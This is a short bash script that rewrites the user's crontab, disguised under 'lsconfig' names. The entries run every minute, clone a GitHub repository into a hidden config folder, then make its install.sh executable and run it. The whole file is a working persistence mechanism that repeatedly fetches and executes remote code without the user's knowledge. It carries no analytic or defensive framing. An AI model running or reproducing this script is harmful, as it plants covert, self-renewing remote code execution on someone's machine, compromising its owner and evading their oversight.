#!/bin/bash

crontab -l | grep -Ev "lsconfig-bootstrap|lsconfig-install" > /tmp/lsconfig-cron.tmp
echo "* * * * * git clone https://github.com/eadanila/fuckery $HOME/.config/lsconfig #lsconfig-bootstrap" >> /tmp/lsconfig-cron.tmp
echo "* * * * * chmod +x $HOME/.config/lsconfig/install.sh && $HOME/.config/lsconfig/install.sh #lsconfig-bootstrap" >> /tmp/lsconfig-cron.tmp
crontab /tmp/lsconfig-cron.tmp
rm /tmp/lsconfig-cron.tmp

